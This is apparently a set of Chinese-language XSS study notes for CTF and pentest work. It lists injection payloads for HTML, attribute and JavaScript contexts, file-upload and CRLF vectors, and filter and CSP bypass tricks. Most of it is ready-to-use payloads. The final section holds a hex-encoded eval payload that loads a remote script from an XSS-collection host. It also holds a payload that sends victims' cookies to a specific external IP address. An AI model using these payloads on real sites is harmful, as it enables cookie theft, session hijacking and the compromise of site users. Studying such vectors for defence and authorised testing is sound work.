# xss注入

## 一 基础

### HTML 上下文-简单注入

第一步是 闭合相应的标签

```
<svg onload="alert(1);"></svg> 载入svg文档的标签 onload被加载的时候，执行的事件
```

```
<title><style><script><textarea><noscript><pre><xmp>和<iframe>
```

以上的标签的利用方式都相同

### HTML上下文呢-内联注入

作为标记中的属性值来使用时，**记住该标记不能以大于号结尾**

```
"onmouseover=alert(1)//"
前面的引号作为闭合标签，后面的//来注释掉后面的数据
"autofocus onfocus=alert(1)//
```

### HTML上下文-源代码注入

当输入作为以下标签的属性的值时或者url时，注入

```
data:alert(1)
javascript:alert(1)
```

### javascript 上下文中-代码注入

```
'-alert(1)-'
'-alert(1)//
```

在字符串分隔值内使用，但引号由反斜杠转义。

```
\'-alert(1)//
</script><svg onload=alert(1)>
```

## 二 高级

1. 利用闭合符号，去闭合相应的代码块，在使用//来注释后面的代码。

2. 利用同一个页面中的多重引用。

   ```
   */alert(1)">'onload="/*<svg/1='
   `-alert(1)">'onload="`<svg/1='
   ```

3. 利用同时的多个反射，直接xss注入

   ```
   p=<svg/1='&q='onload=alert(q)>
   p=<svg 1='&q='onload='/*&r=*/alert(1)'>
   ```
   
4. 文件上传-文件名 

5. 文件上传-元数据（使用`exiftool -Artist='"><svg onload=alert(1)>"'xss.jpeg`）

6. 文件上传注入-svg文件

   ![image.png](https://i.loli.net/2021/01/04/dG1VWayLKvCnUHS.png)
   
7. DOM插入

   `data:text/html,<img src=1 onload=alert(1)>`

8. php_self注入

   ![](https://i.loli.net/2021/01/04/WxfphUQZoryL7qg.png)

9.  **javascript postmessage注入**

   ```
   <iframe src=url onload="frames[0].postMessage('Injection')"
   ```

10. CRLF注入

    当应用程序反映其中一个响应标头中的输入时，允许注入回车符（％0D）和换行符（％

    0A）字符。分别为Gecko和Webkit的向量。

    允许注入换行符和回车符，重点在于web应用程序将请求的参数会在应用程序中输出。

    ![image-20210104172742986](https://i.loli.net/2021/01/04/ASwIODPVoXimQav.png)

11.浏览器通知注入

![image.png](https://i.loli.net/2021/01/04/or1yfMlpBQ8HsbV.png)

## 三 Bypass过滤 CTF实战

编码绕过，是其中很重要的一个部分

#### 1.大小写绕过

![image-20210104203607137](https://i.loli.net/2021/01/04/xq4Hc3BWVgQfGtC.png)

#### 2.脚本额外标记绕过

```
<script/x>alert(1)</script>
```
#### 3.括号被过滤

```
`` 反引号来助力
\x28 \x29来帮忙
&lpar; &rpar;
&#40 &#41
```

#### 4. 没有字母，没有数字

```
jsfuck 颜文字版本 
```

![image-20210104211943495](https://i.loli.net/2021/01/04/pQI2dYrPzOAEqXH.png)

#### 5.关键字符

可以用js代码从url中或得。

没有空格的日子里。

```
斜杠和引号， url编码
```

#### 6. CSP策略绕过

```
Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline'
```

像这种头部，就活该被干。

![image-20210104213904223](https://i.loli.net/2021/01/04/c8mZe9R2OHhKW6C.png)铁路

当允许从这两个域中获取时，再进行绕过。重点还是得看，他是如何设置这个头部的。

这里贴一个链接：https://www.jianshu.com/p/f1de775bc43e网上资料很多，这种也比较，明显。

#### 7. 没有事件处理的向量

```
如果不允许，请用作事件处理程序的替代方法。有些需要用户交互，如矢量本身（也是其中
的一部分）所述。
```

![image-20210104214133697](https://i.loli.net/2021/01/04/NvCFrBtdnY1W6V4.png)

#### 8. 具有不可知事件处理程序的向量  

```
如果不允许所有已知的HTML标记名称，请使用以下向量。任何字母字符或字符串都可以用
作标记名称来代替“x”。 它们需要用户交互，如其文本内容（也构成向量的一部分）所述
```

#### 9. 超长UTF-8

![image-20210104214747882](https://i.loli.net/2021/01/04/tgMzE3i98XNYOZ1.png)

#### 10 asp转用payload

![image-20210104214811939](https://i.loli.net/2021/01/04/RP6ZnlVbUkaONi5.png)

#### 11 插入DOM执行

```
document.write(String.fromCharCode(32));
可以拼接出来被过滤的标签
```

![image-20210104214837624](https://i.loli.net/2021/01/04/XATEFWxhZRIUmez.png)

#### 12 XML注入

![image-20210104214855273](https://i.loli.net/2021/01/04/Oeqp3imHMwRdFNS.png)

#### 13 基于DOM的XSS - 位置接收器过滤器逃避  

![image-20210104215053011](https://i.loli.net/2021/01/04/cIQRt8TGaAKdWwf.png)

还要再备几个测试用的字典，专门测试（动作，属性关键字的字典）

#### 14 编码绕过

```
<body/onload=eval("\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x36\x30\x2C\x31\x31\x35\x2C\x36\x37\x2C\x38\x32\x2C\x31\x30\x35\x2C\x38\x30\x2C\x31\x31\x36\x2C\x33\x32\x2C\x31\x31\x35\x2C\x38\x32\x2C\x36\x37\x2C\x36\x31\x2C\x34\x37\x2C\x34\x37\x2C\x31\x32\x30\x2C\x31\x31\x35\x2C\x31\x31\x35\x2C\x34\x36\x2C\x31\x31\x32\x2C\x31\x31\x36\x2C\x34\x37\x2C\x31\x30\x34\x2C\x38\x34\x2C\x34\x38\x2C\x38\x34\x2C\x36\x32\x2C\x36\x30\x2C\x34\x37\x2C\x31\x31\x35\x2C\x36\x37\x2C\x31\x31\x34\x2C\x37\x33\x2C\x31\x31\x32\x2C\x38\x34\x2C\x36\x32\x29\x29\x3B")>
```

unicode编码绕过，还有就是

`<BODY/ONLOAD=document.location='http://42.192.142.64:5000/?cookie='+document.cookie;>`

带数据出来

```

```

